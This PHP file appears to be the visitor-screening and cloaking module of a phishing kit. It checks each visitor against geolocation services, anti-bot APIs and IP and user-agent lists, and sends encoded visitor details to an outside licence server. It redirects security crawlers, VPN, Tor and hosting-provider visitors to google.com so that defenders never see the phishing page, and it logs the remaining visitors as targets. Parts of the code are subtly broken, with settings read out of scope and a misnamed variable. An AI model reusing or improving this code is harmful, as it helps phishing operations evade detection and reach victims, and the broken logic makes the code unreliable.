<?php
session_start();
ob_start();
$PathBad = getcwd();
require 'Settings/Settings.php';


function SaveBotsLogs($Cause)
{
    $PathBad = getcwd();
    $ua = $_SESSION['UA'];
    $ip = getIPAddress();
    $PathR = $PathBad.'/Settings/Bots-Logs/Bots.txt';
    $Path = $PathR;
    $Text = '✔️✔️✔️{'.$Cause.'}✔️✔️✔️'.PHP_EOL;
    $Text .= '🥊🥊🥊 BOT FUCKED 🥊🥊🥊 '.PHP_EOL;
    $Text .= 'IP: '.$ip.PHP_EOL;
    $Text .= 'User-Agent: '.$ua.PHP_EOL;
    $Text .= 'Date: '.date("Y/m/d").PHP_EOL;
    $Text .= '✔️✔️✔️{'.$Cause.'}✔️✔️✔️'.PHP_EOL;
    if (file_exists($Path)) 
    {
        $FileOpen = fopen($Path,'a+');
        fwrite($FileOpen, $Text);
        fclose($FileOpen);
    }else
    {
        $FileOpen = fopen($Path,'w');
        fwrite($FileOpen, $Text);
        fclose($FileOpen);
    }
}
function SaveClientLogs($ua){
    $PathBad = getcwd();

    $ip = getIPAddress();
    $PathR = $PathBad.'/Settings/Clients-Logs/Clicks.txt';
    $Path = $PathR;
    $Text = '👥👥💸-💸👥👥'.PHP_EOL;
    $Text .= '💲💲💲Visitor💲💲💲'.PHP_EOL;
    $Text .= 'IP: '.$ip.PHP_EOL;
    $Text .= 'User-Agent: '.$ua.PHP_EOL;
    $Text .= 'Date: '.date("Y/m/d").PHP_EOL;
    $Text .= '👥🇺🇸💸-💸🇺🇸👥'.PHP_EOL;
    if (file_exists($Path)) 
    {
        $FileOpen = fopen($Path,'a+');
        fwrite($FileOpen, $Text);
        fclose($FileOpen);
    }else
    {
        $FileOpen = fopen($Path,'w');
        fwrite($FileOpen, $Text);
        fclose($FileOpen);
    }
}
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function genRandString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }
    
    
    function fetch_value($str, $find_start, $find_end)
    {
        $start = strpos($str, $find_start);
        if ($start === false) {
            return "";
        }
        $length = strlen($find_start);
        $end    = strpos(substr($str, $start + $length), $find_end);
        return trim(substr($str, $start + $length, $end));
    }   

function startsWith( $haystack, $needle ) {
     $length = strlen( $needle );
     return substr( $haystack, 0, $length ) === $needle;
}
if(!function_exists('redirect_to'))
{
    function redirect_to($code, $url = 0)
    {
        if ($code == 302) 
        {
            if (($url=="https://google.com")!== false)
            {
                $url = "underwork/index";
            }
            header("Location: ".$url);
            die();
        } elseif ($code == 404) {
            header("HTTP/1.0 404 Not Found");
            die("Page Not Found / You are not authorized to access this page.");
        }
        
    }
}
function SendHits($url,$post){
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($post));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);


}
function execute_http($url)
{
    $url = trim($url);
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_FAILONERROR, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
    $result = curl_exec($curl);

    return $result;
}

function get_ip1($ip)
{
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip;
    $resp = execute_http($url);
    return $resp;
}

function get_ip2($ip)
{
    $url = 'http://extreme-ip-lookup.com/json/'.$ip;
    $resp = execute_http($url);
    return $resp;
}

function MainCountryLookup($ip)
{
    $details = get_ip1($ip);
    $details = json_decode($details, true);
    $countryname = $details['geoplugin_countryName'];
    $countrycode = $details['geoplugin_countryCode'];
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['geoplugin_continentName'];
    $citykota = $details['geoplugin_city'];
    $regioncity = $details['geoplugin_region'];
    $timezone = $details['geoplugin_timezone'];
    $kurenci = $details['geoplugin_currencySymbol_UTF8'];
    if ($countryname == "") {
        $details = get_ip2($ip);
        $details = json_decode($details, true);
        $countryname = $details['country'];
        $countrycode = $details['countryCode'];
        $cn = $countryname;
        $cid = $countrycode;
        $continent = $details['continent'];
        $citykota = $details['city'];
        }
    return $cid;
}


function get_ip_country($ip)
{
    $CountryCode = MainCountryLookup($ip);
    if (strpos(strtolower($CountryLock), 'yes') !== false)
    {
        $CountryCode = strtolower($CountryCode);
        if (in_array($CountryCode, $CountryLockCountries) !== true)
        {
            SaveBotsLogs('CountryLock(Blocked-Country){'.$CountryCode.'}');
            redirect_to(302,'https://google.com');
        }
    }
}
function getIPAddress()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    //whether ip is from the public internet  
    $isValid = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
    if (($isValid))
    {
        return $ip; 
    }else{
        SaveBotsLogs('Blacklisted-IP{NonValid-IP}');
        redirect_to(302,'https://google.com');
    }
}  
function Funcc($ip,$ua){
    if (strpos(strtolower($block_blank_useragent),'yes') !== false){
        if (($ua == '' || $ua == " ") !== false){
            SaveBotsLogs('Blank-UserAgent');
            redirect_to(302,'https://google.com');
        }
    }

    if (strpos(strtolower($AntiBotPW), 'yes') !== false)
    {
        $_data_ = execute_http("https://www.antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$AntiBotPWToken."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
        $_parsed_ = json_decode($_data_, true);
        if (($_parsed_['is_bot'] == true) !== false)
        {
            SaveBotsLogs('Blacklisted-IP{AntiBot.PW}');
            redirect_to(302,'https://google.com');
        }
    }
    if (strpos(strtolower($KillBot), 'yes') !== false)
    {
        $dataa = execute_http("https://killbot.org/api/v2/blocker?ip=".$ip."&ua=".$ua."&apikey=".$KillBotPW);
        $parsedd = json_decode($data, true);
        $is_proxy = $parsedd['data']['account']['info']['is_proxy'];
        $is_badip = $parsedd['data']['account']['info']['is_badip'];
        $is_non_isp = $parsedd['data']['account']['info']['is_non_isp'];
        $is_crawler = $parsedd['data']['account']['info']['is_crawler'];
        $is_malicious = $parsedd['data']['account']['info']['is_malicious'];
        $is_blacklist_ip = $parsedd['data']['account']['info']['is_blacklist_ip'];
        $is_blacklist_hostname = $parsedd['data']['account']['info']['is_blacklist_hostname'];
        if (($is_proxy == true) !== false){
            SaveBotsLogs('Blacklisted-IP{Proxy}{KillBot}');
            redirect_to(302,'https://google.com');
        }
        if (($is_badip == true) !== false){
            SaveBotsLogs('Blacklisted-IP{BADIP}{KillBot}');
            redirect_to(302,'https://google.com');
        }
        if (($is_non_isp == true) !== false){
            SaveBotsLogs('Blacklisted-IP{NON-ISP}{KillBot}');
            redirect_to(302,'https://google.com');
        }
        if (($is_crawler == true) !== false){
            SaveBotsLogs('Blacklisted-IP{Crawler}{KillBot}');
            redirect_to(302,'https://google.com');
        }
        if (($is_malicious == true) !== false){
            SaveBotsLogs('Blacklisted-IP{Malicious}{KillBot}');
            redirect_to(302,'https://google.com');
        }
        if (($is_blacklist_ip == true) !== false){
            SaveBotsLogs('Blacklisted-IP{KillBot}');
            redirect_to(302,'https://google.com');
        }
        if (($is_blacklist_hostname == true) !== false){
            SaveBotsLogs('Blacklisted-Hostname{KillBot}');
            redirect_to(302,'https://google.com');
        }
    }
}
function can_visit()
{
    require 'Settings/Settings.php';
    $Path = getcwd();
    $ua = $_SESSION['UA'];
    $ip = getIPAddress();
    $WhiteList = file_get_contents($Path.'/Settings/whitelist.dat');
    $WhiteList = explode(PHP_EOL,$WhiteList);
    $OP = file_get_contents($Path.'/logintoyouraccount/OP.txt');
    $OP = explode(PHP_EOL,$OP);
    $OF = file_get_contents($Path.'/logintoyouraccount/OF.txt');
    $OF = explode(PHP_EOL,$OF);
    if (in_array($ip,$OP)){
        SaveBotsLogs($Cause);
        redirect_to(302,'https://google.com');
    }
    if (in_array($ua,$OF)){
        SaveBotsLogs($Cause);
        redirect_to(302,'https://google.com');
    }
    if (in_array($ip,$WhiteList)){
        //pass
    }else{
        Funcc($ip,$ua);
        $Params = '?license='.$LICENSEKEY.'&ua='.$ua.'&ip='.$ip.'&referer='.$_SERVER['HTTP_REFERER'];
        $Params .= '&allow_use_specified_browsers='.$allow_use_specified_browsers;
        $Params .= '&block_some_windows_version='.$block_some_windows_version;
        $Params .= '&block_unknown_os='.$block_unknown_os;
        $Params .= '&block_unknown_browser='.$block_unknown_browser;
        $Params .= '&getipintel='.$getipintel;
        $Params .= '&iptrooper='.$iptrooper;
        $Params .= '&setmaxfraudscore='.$setmaxfraudscore.'&maxfraudscore='.$maxfraudscore;
        $Params .= '&fuck_vpn='.$fuck_vpn;
        $Params .= '&fuck_tor='.$fuck_tor;
        $Params .= '&fuck_crawlers='.$fuck_crawlers;
        $Params .= '&block_mobile='.$block_mobile.'&block_apple='.$block_apple;
        $Params .= '&fuck_hosting_ips='.$fuck_hosting_ips.'&fuck_bad_isp='.$fuck_bad_isp.'&block_bad_devices='.$block_bad_devices.'&good_devices='.$good_devices.'&allowed_browsers='.$allowed_browsers.'&allowed_operating_systems='.$allowed_operating_systems.'&blocked_windows_versions='.$blocked_windows_versions;
        $Jrd = base64_encode($Params);
        $OUTPT = execute_http('https://bestwaytohelpyourfamilyandself.com/GDG/index.php?Value='.$Jrd);
        $OUTPUTJSON = json_decode($OUTPT, true);
        $Status = $OUTPUTJSON["status"];
        $Cause = $OUTPUTJSON['cause'];

        // SOME SMALL CHECK
        // MAIN CHECK
        if (strpos($Status,'true') !== false){
            SaveBotsLogs($Cause);
            redirect_to(302,'https://google.com');
        }if (strpos($Status,'false') !== false){
            SaveClientLogs($ua);
        }else{
            redirect_to(302,'https://activateyourscampage.com');
        }
    }
}

?>
